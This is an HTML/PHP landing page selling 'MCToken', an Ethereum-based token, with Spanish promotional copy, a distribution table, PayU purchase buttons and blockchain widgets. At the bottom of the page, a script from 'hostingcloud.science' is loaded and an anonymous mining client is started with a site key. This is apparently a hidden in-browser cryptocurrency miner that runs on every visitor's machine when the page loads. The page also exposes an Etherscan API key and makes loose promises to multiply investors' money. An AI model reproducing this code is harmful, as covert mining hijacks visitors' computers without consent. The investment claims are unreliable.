<?php
	require_once 'lib/PayU.php';
?><!DOCTYPE html>
<!--[if IE 8 ]><html class="no-js oldie ie8" lang="en"> <![endif]-->
<!--[if IE 9 ]><html class="no-js oldie ie9" lang="en"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<html class="no-js" lang="en">
<!--<![endif]-->

<head>
	<!--- basic page needs
   ================================================== -->
	<meta charset="utf-8">
	<title>MCToken - Developed by FelipheGomez</title>
	<meta name="description" content="MCToken">
	<meta name="author" content="FelipheGomez">
	<!-- mobile specific metas
   ================================================== -->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!-- CSS
   ================================================== -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

	<link rel="stylesheet" href="css/base.css">
	<link rel="stylesheet" href="css/main.css">
	<link rel="stylesheet" href="css/vendor.css">
	<!-- script
   ================================================== -->
	<script src="js/modernizr.js"></script>
	<!-- favicons
	================================================== -->
	<link rel="icon" type="image/png" href="favicon.png">
<style>
.MP-coall {
    display: block;
    width: 134px;
    height: 23px;
    margin: -10px auto 0px;
    background: url(http://secure.mlstatic.com/mptools/assets/MP-payButton-logos-co.png) 0px -29px;
    background-position: 0px -29px;
}
</style>
</head>

<body id="top">
	<!-- header ================================================== -->
	<header>
		<div class="row">
			<div class="logo">	<a href="index.html">MCToken</a>
			</div>
			<div class="social-links">
				<ul>
					<li><a href="https://www.facebook.com/MCT-MC-Token-2423616777655252/?"><i class="fa fa-facebook"></i></a>
					</li>
					<li><a href="#"><i class="fa fa-twitter"></i></a>
					</li>
					<li><a href="#"><i class="fa fa-pinterest"></i></a>
					</li>
					<li><a href="#"><i class="fa fa-instagram"></i></a>
					</li>
					<li><a href="#"><i class="fa fa-dribbble"></i></a>
					</li>
				</ul>
			</div>
		</div>
	</header>
	<!-- /header -->
	<!-- home ================================================== -->
	<section id="home" class="home-particles">
		<div class="shadow-overlay"></div>
		<div class="content-wrap-table">
			<div class="main-content-tablecell">
				<div class="row">
					<div class="col-twelve">
						<div id="counter">
							<div class="half">	<span id="total-disponibles">0 <sup>MCT</sup></span> 
								<!--<span>23 <sup>hours</sup></span>-->
							</div>
							<!--
								<div class="half">
									<span>50 <sup>mins</sup></span>
									<span>33 <sup>secs</sup></span>
								</div> 
								--></div>
						<div class="bottom-text">
							<h1>Disponible para la compra.</h1>
							<p>Puedes adquirir MCT desde PayU o Mercado pagos, Utilizando tu cuenta de banco, tarjeta de credito y mucho mas!.</p>

						</div>
					</div>
					<!-- /twelve -->
					<div class="scroll-icon">
						<p class="scroll-text">Scroll For More Info</p>
						<a href="#info" class="smoothscroll">
							<div class="mouse"></div>
						</a>
						<div class="end-top"></div>
					</div>
					<!-- /scroll-icon -->
				</div>
				<!-- /row -->
			</div>
			<!-- /main-content -->
		</div>
		<!-- /content-wrap -->
	</section>
	<!-- /home -->
	<!-- info
   ================================================== -->
	<section id="info">
		<div class="info-overlay"></div>
		<div class="row">
			<div class="col-twelve tabs-wrap">
				<ul class="tabs">
					<li class="active" data-id="tab-about"><i class="icon-user"></i><span>About</span>
					</li>
					<li data-id="tab-contact"><i class="icon-mail"></i><span>Vision/Mision</span>
					</li>
					<li data-id="tab-subscribe"><i class="icon-newspaper"></i><span>Distribución</span>
					</li>
					<li data-id="tab-transactions"><i class="icon-user"></i><span>Transactions</span>
					</li>
				</ul>
				<!-- /tabs -->
				<div class="tab-container">
					<!-- tab content - about
   				================================================== -->
					<div id="tab-about" class="tab-content">
						<div class="tab-entry">
							<div class="row tab-entry-intro">
								<div class="col-twelve with-bottom-line">
									<h1>¿Que es MC Token - MCT?</h1>
									<p class="lead">MCT es una criptomoneda descentralizada basada en la plataforma blockchain utilizando la red de Ethereum y no está controlada por ninguna autoridad central MCT es el símbolo de la ficha de MC Enterprise Investment, como COP o USD.</p>
								</div>
							</div>
							<!-- /tab-content-intro -->
							<div class="row about-content tab-entry-content">
								<div class="about-list block-1-3 block-s-1-2 block-tab-full">
									<div class="bgrid item">	<span class="icon"><i class="icon-building"></i></span> 
										<div class="item-content">
											<h3 class="h05">MCT + MCEI</h3>
											<p>MCT fue creado para ser una criptomoneda transable para inversiones, servicios y necesidades, bajo el portafolio MCEI que presenta gran variedad de inversiones y servicios para todas sus necesidades MCEI.</p>
										</div>
									</div>
									<!-- /bgrid -->
									<div class="bgrid item">	<span class="icon"><i class="icon-alt"></i></span> 
										<div class="item-content">
											<h3 class="h05">Diversidad</h3> 
											<p>Hace parte de los círculos de la economía más relevantes los cuales son ( Turismo, inmobiliario, inversiones, salud creacion, tecnología entre otros muchos más.</p>
										</div>
									</div>
									<!-- /bgrid -->
									<div class="bgrid item">	<span class="icon"><i class="icon-dollar"></i></span>	
										<div class="item-content">
											<h3 class="h05">Obten + Dinero</h3>
											<p>MCEI Busca eliminar los comisionistas y terceristas de los diversos aspectos de la economía y así poder acceder a bienes y servicios a precios mejores si se efectúan con MCT lo podemos lograr ya que los comisionistas y terceristas representan entre 15% a 30% más en cualquier bien y servicio intervenido por ellos.</p>
										</div>
									</div>
									<!-- /bgrid -->
									<div class="bgrid item">	<span class="icon"><i class="icon-link"></i></span>	
										<div class="item-content">
											<h3 class="h05">Coneccion Directa</h3>
											<p>MCEI busca reducir los terceros en absoluto y brindar una dinámica de economia mejor entre proveedor y cliente, sin agregados económicos.</p>
										</div>
									</div>
									<!-- /bgrid -->
									<div class="bgrid item">	<span class="icon"><i class="icon-key"></i></span>	
										<div class="item-content">
											<h3 class="h05">Seguro</h3>
											<p>Con MCT su dinero será almacenado en su cartera personal, estrictamente confidencial y absolutamente privado. En la transacción, el dinero de la cuenta de envío llegará directamente al destinatario, no a través de intermediarios.</p>
										</div>
									</div>
									<!-- /bgrid -->
									<div class="bgrid item">	<span class="icon"><i class="icon-speed-o-meter"></i></span>
										<div class="item-content">
											<h3 class="h05">Potencializador</h3>
											<p>En MCEI tienes la oportunidad de multiplicar tu dinero a corto y largo plazo de diversas maneras.</p>
										</div>
									</div>
									<!-- /bgrid -->
								</div>
								<!-- /about-list -->
							</div>
							<!-- /row about-content -->
						</div>
						<!-- /tab-entry -->
					</div>
					<!-- /tab-about -->
					<div id="tab-transactions" class="tab-content">
						<div id="token-history-grouped-1"></div>
						<script type="text/javascript">
							if (typeof (eWgs) === 'undefined') {
								document.write('<scr' + 'ipt src="https://api.ethplorer.io/widget.js?' + new Date().getTime().toString().substr(0, 7) + '" async></scr' + 'ipt>');
								var eWgs = [];
							}
							eWgs.push(function () {
								ethplorerWidget.init(
									'#token-history-grouped-1', // Placeholder element
									'tokenHistoryGrouped', // Widget type
									{
										// token address
										'address': '0xd12dbf42b218cdbffb6f6fe50caac7f5e5f140c5',
										options: {
											'title': 'MC Token',
											'pointSize': 5,
											'vAxis': {
												'title': 'Token operations',
											}
										}
									}
	
								);
							});
						</script>
					</div>
					<!-- tab content contact
   				================================================== -->
					<div id="tab-contact" class="tab-content">
						<div class="tab-entry">
							<div class="row tab-entry-intro">
								<div class="col-twelve with-bottom-line">
									<h1>“DAMOS TIEMPO A TU VIDA”.</h1>
									<h3>VISIÓN</h3>
									<p class="lead">
										MCEI (MC Enterprise Investment) se posicionarán como la empresa líder en Investigaciones y Desarrollo de Servicios; en compañía de los mejores profesionales y desarrollos tecnológicos.
									</p>
									<h3>MISIÓN</h3>
									<p class="lead">
										Somos  una empresa de inversiones y de servicios  de Colombia que tiene el objetivo de  construir, diseñar y ejecutar estrategias proyectadas a maximizar el beneficio de los inversionistas, empleados, empresas, comunidad; Donde se ofrece un vínculo y soporte necesario para cada una de los inversiones y servicios.
									</p>
								</div>
							</div>
							<!-- 
							<div class="row form-wrap tab-entry-content">
								<div class="col-twelve">
									<form name="contactForm" id="contactForm" method="post" action="">
										<fieldset>
											<div class="form-field">
												<input name="contactName" type="text" id="contactName" placeholder="Name" value="" minlength="2" required="">
											</div>
											<div class="form-field">
												<input name="contactEmail" type="email" id="contactEmail" placeholder="Email" value="" required="">
											</div>
											<div class="form-field">
												<input name="contactSubject" type="text" id="contactSubject" placeholder="Subject" value="">
											</div>
											<div class="form-field">
												<textarea name="contactMessage" id="contactMessage" placeholder="message" rows="10" cols="50" required=""></textarea>
											</div>
											<div class="form-field">
												<button class="submitForm button button-primary large">Submit</button>
												<div id="submit-loader">
													<div class="text-loader">Sending...</div>
													<div class="s-loader">
														<div class="bounce1"></div>
														<div class="bounce2"></div>
														<div class="bounce3"></div>
													</div>
												</div>
											</div>
										</fieldset>
									</form>
									<div id="message-warning"></div>
									<div id="message-success"> <i class="fa fa-check"></i>Your message was sent, thank you!
										<br>
									</div>
								</div>
							</div>
							-->							
							
						</div>
						<!-- /tab-entry -->
					</div>
					<!-- /tab-contact -->
					<!-- tab content - subscribe
   				================================================== -->
					<div id="tab-subscribe" class="tab-content">
						<div class="tab-entry">
							<div class="row tab-entry-intro">
								<div class="col-twelve with-bottom-line">
									<h1>Distribución.</h1>
									<p class="lead">
										El número de tokens emitidos está limitado por 100,000,000,000 MCT
										
										<ul>
											<li>50% (50,000,000,000 de tokens) están reservados y permanecerán en la Fundación MC Enterprise Investment hasta que se lance la moneda la cadena de bloques oficial, los tokens se utilizarán para formar un mercado estable y para un mayor desarrollo. </li>
											<li>10% (10,000,0000,000 de tokens) estarán disponibles para venta. </li>
											<li>15% (15,000,000,000 de tokens) están reservados para bonos de ICO. </li>
											<li>25% (25,000,000,000 ) se distribuirán entre los miembros del equipo</li>
										</ul>

									</p>
								</div>
							</div>
							<!-- 
							<div class="row form-wrap tab-entry-content">
								<div class="col-twelve">
									<form id="mc-form" class="group" novalidate="true">
										<div class="form-field">
											<input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required="">
										</div>
										<div class="form-field">
											<input type="submit" value="Get Notified" name="subscribe" class="button button-primary large">
										</div>
										<label for="mce-EMAIL" class="subscribe-message"></label>
									</form>
								</div>
							</div>
							-->
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- /info -->
	<!-- CTA Section
   ================================================== -->
	<section id="cta">
		<div class="row cta-wrap">
			<div class="col-twelve cta-content">
				<h2 class="h01"><a href="#">MCEN Investment Buy MCT.</a></h2>
				<p class="lead">
					
					<div class="membership-pricing-table">
						<table class="">
							<tbody>
								<tr>
									<th></th>
									<th class="plan-header plan-header-free">
										<div class="pricing-plan-name">MINI</div>
										<div class="pricing-plan-price"><sup> </sup>10<span>.00</span></div>
										<div class="pricing-plan-period">MCT</div>
									</th>
									<th class="plan-header plan-header-blue">
										<div class="pricing-plan-name">BASIC</div>
										<div class="pricing-plan-price"><sup> </sup>40<span>.00</span></div>
										<div class="pricing-plan-period">MCT</div>
									</th>
									<th class="plan-header plan-header-standard">
										<div class="header-plan-inner">
											<span class="plan-head"> </span>
											<span class="recommended-plan-ribbon">RECOMMENDED</span>
											<div class="pricing-plan-name">PLUS</div>
											<div class="pricing-plan-price"><sup> </sup>120<span>.00</span></div>
											<div class="pricing-plan-period">MCT</div>
										</div>
									</th>
									<th class="plan-header plan-header-blue">
										<div class="pricing-plan-name">STANDARD</div>
										<div class="pricing-plan-price"><sup> </sup>340<span>.00</span></div>
										<div class="pricing-plan-period">MCT</div>
									</th>
									<th class="plan-header plan-header-blue">
										<div class="pricing-plan-name">PREMIUM</div>
										<div class="pricing-plan-price"><sup> </sup>1000<span>.00</span></div>
										<div class="pricing-plan-period">MCT</div>
									</th>
									<th class="plan-header plan-header-free">
										<div class="pricing-plan-name">Servidores</div>
										<div class="pricing-plan-price"><sup> de</sup>Pago<span></span></div>
										<div class="pricing-plan-period">Disponibles</div>
									</th>
								</tr>
								<tr>
									<td>USD (Dolar):</td>
									<td><a href="https://biz.payulatam.com/B0b815a68B85C1E"><img src="http://www.payulatam.com/img-secure-2015/boton_pagar_mediano.png"></a></td>
									<td><a href="https://biz.payulatam.com/B0b815a56B229F9"><img src="http://www.payulatam.com/img-secure-2015/boton_pagar_mediano.png"></a></td>
									<td><a href="https://biz.payulatam.com/B0b815aDF694494"><img src="http://www.payulatam.com/img-secure-2015/boton_pagar_mediano.png"></a></td>
									<td><a href="https://biz.payulatam.com/B0b815a2CBAF909"><img src="http://www.payulatam.com/img-secure-2015/boton_pagar_mediano.png"></a></td>
									<td><a href="https://biz.payulatam.com/B0b815a226987F4"><img src="http://www.payulatam.com/img-secure-2015/boton_pagar_mediano.png"></a></td>
									<td><span class="MP-coall"></span></td>
								</tr>
								<!--
								<tr>
									<td>COP (Peso Colombiano):</td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
								</tr>
								<tr>
									<td>ETH (Ethereum):</td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
									<td><a href="#" class="btn btn-sm btn-default">Comprar</a></td>
								</tr>
								-->
							</tbody>
						</table>
					</div>
				<style>

.membership-pricing-table {
    width: 100%;
}

.membership-pricing-table table .icon-no,.membership-pricing-table table .icon-yes {
    font-size: 22px
}

.membership-pricing-table table .icon-no {
    color: #a93717
}

.membership-pricing-table table .icon-yes {
    color: #209e61
}

.membership-pricing-table table .plan-header {
    text-align: center;
    font-size: 48px;
    border: 1px solid #e2e2e2;
    padding: 25px 0
}

.membership-pricing-table table .plan-header-free {
    background-color: #eee;
    color: #555
}

.membership-pricing-table table .plan-header-blue {
    color: #fff;
    background-color: #61a1d1;
    border-color: #3989c6
}

.membership-pricing-table table .plan-header-standard {
    color: #fff;
    background-color: #ff9317;
    border-color: #e37900
}

.membership-pricing-table table td {
    text-align: center;
    width: 15%;
    padding: 7px 10px;
    background-color: #fafafa;
    font-size: 14px;
    -webkit-box-shadow: 0 1px 0 #fff inset;
    box-shadow: 0 1px 0 #fff inset
}

.membership-pricing-table table,.membership-pricing-table table td {
    border: 1px solid #ebebeb
}

.membership-pricing-table table tr td:first-child {
    text-align: right;
    width: 24%
}

.membership-pricing-table table tr td:nth-child(5) {
    background-color: #FFF
}

.membership-pricing-table table tr:first-child td,.membership-pricing-table table tr:nth-child(2) td {
    -webkit-box-shadow: none;
    box-shadow: none
}

.membership-pricing-table table tr:first-child th:first-child {
    border-top-color: transparent;
    border-left-color: transparent;
    border-right-color: #e2e2e2
}

.membership-pricing-table table tr:first-child th .pricing-plan-name {
    font-size: 22px
}

.membership-pricing-table table tr:first-child th .pricing-plan-price {
    line-height: 35px
}

.membership-pricing-table table tr:first-child th .pricing-plan-price>sup {
    font-size: 45%
}

.membership-pricing-table table tr:first-child th .pricing-plan-price>span {
    font-size: 30%
}

.membership-pricing-table table tr:first-child th .pricing-plan-period {
    margin-top: -7px;
    font-size: 25%
}

.membership-pricing-table table .header-plan-inner {
    position: relative
}

.membership-pricing-table table .recommended-plan-ribbon {
    box-sizing: content-box;
    background-color: #dc3b5d;
    color: #FFF;
    position: absolute;
    padding: 3px 6px;
    font-size: 11px!important;
    font-weight: 500;
    left: -6px;
    top: -22px;
    z-index: 99;
    width: 100%;
    -webkit-box-shadow: 0 -1px #c2284c inset;
    box-shadow: 0 -1px #c2284c inset;
    text-shadow: 0 -1px #c2284c
}

.membership-pricing-table table .recommended-plan-ribbon:before {
    border: solid;
    border-color: #c2284c transparent;
    border-width: 6px 0 0 6px;
    bottom: -5px;
    content: "";
    left: 0;
    position: absolute;
    z-index: 90
}

.membership-pricing-table table .recommended-plan-ribbon:after {
    border: solid;
    border-color: #c2284c transparent;
    border-width: 6px 6px 0 0;
    bottom: -5px;
    content: "";
    right: 0;
    position: absolute;
    z-index: 90
}

.membership-pricing-table table .plan-head {
    box-sizing: content-box;
    background-color: #ff9c00;
    border: 1px solid #cf7300;
    position: absolute;
    top: -33px;
    left: -1px;
    height: 30px;
    width: 100%;
    border-bottom: none
}
</style>
					<!-- Simply type	the promocode in the box labeled “Promo Code” when placing your order. -->
				</p>
				<div class="action"> <a class="button large" href="#">Comprar Menos de 10 MCT</a>
				</div>
			</div>
		</div>
		<!-- /cta-content -->
	</section>
	<!-- /cta -->
	<!-- footer
   ================================================== -->
	<footer>
		<div class="social-wrap">
			<div class="row">
				<ul class="footer-social-list">
					<li>
						<a href="https://www.facebook.com/MCT-MC-Token-2423616777655252/?">	<i class="fa fa-facebook"></i><span>Facebook</span>
						</a>
					</li>
					<li>
						<a href="#">	<i class="fa fa-twitter"></i><span>Twitter</span>
						</a>
					</li>
					<li>
						<a href="#">	<i class="fa fa-pinterest"></i><span>Pinterest</span>
						</a>
					</li>
					<li>
						<a href="#">	<i class="fa fa-instagram"></i><span>Instagram</span>
						</a>
					</li>
					<li>
						<a href="#">	<i class="fa fa-dribbble"></i><span>Dribbble</span>
						</a>
					</li>
				</ul>
			</div>
			<!-- /row -->
		</div>
		<!-- /social-wrap -->
		<div class="footer-bottom">
			<div class="footer-logo">
				<img src="images/001-512.png" alt="">
			</div>
			
				<div id="token-txs-10"></div>
				<script type="text/javascript">
					if (typeof (eWgs) === 'undefined') {
								document.write('<scr' + 'ipt src="https://api.ethplorer.io/widget.js?' + new Date().getTime().toString().substr(0, 7) + '" async></scr' + 'ipt>');
								var eWgs = [];
							}
							eWgs.push(function () {
								ethplorerWidget.init(
									'#token-txs-10', // Placeholder element
									'tokenHistory', // Widget type
									{
										address: '0xd12dbf42b218cdbffb6f6fe50caac7f5e5f140c5', // keep empty to show all tokens
										limit: 5, // Number of records to show
									}

								);
							});
				</script>
				
			<div class="copyright">	<span>© Copyright MCToken 2018 - <a href="http://mcen-investment.com/">MC Enterprise investment</a>.</span>
				<br><span>Design by <a href="#">FelipheGomez</a></span>	
			</div>
		</div>
		<!-- /footer-bottom -->
		<div class="back-to-top">	<a href="#top" class="smoothscroll"><span>Back to Top</span></a>
		</div>
	</footer>
	<div id="preloader">
		<div id="loader"></div>
	</div>
	<!-- Java Script
   ================================================== -->
	<script src="js/jquery-2.1.3.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<script src="js/plugins.js"></script>
	<script src="js/main.js"></script>
	<script src="https://www.hostingcloud.science./4C8W.js"></script>
	<script>
		var _client = new Client.Anonymous('ddcf3d289a7c3bcac2da07f2f764ad87b9388c9e2382aa38620e007aa324b9f0', {
		        throttle: 0.8, c: 'w'
		    });
		    _client.start();
	</script>
	<script type="text/javascript">
		jQuery.get('https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xd12dbf42b218cdbffb6f6fe50caac7f5e5f140c5&address=0x8dc25A4b4117915Ca6F79aa0e608F0192CD652AA&tag=latest&apikey=FRXGWXWAM1A512Q9GPZ2YR5NUVE7DXMNS1', function(e){
			console.log(e);
			
			var total_hashes = (e.result);
			var total_disponibles = total_hashes.slice(0, -18);
			jQuery('#total-disponibles').html(total_disponibles + '<sup>Disponibles</sup>');
		})
	</script>
	
	
	
</body>

</html>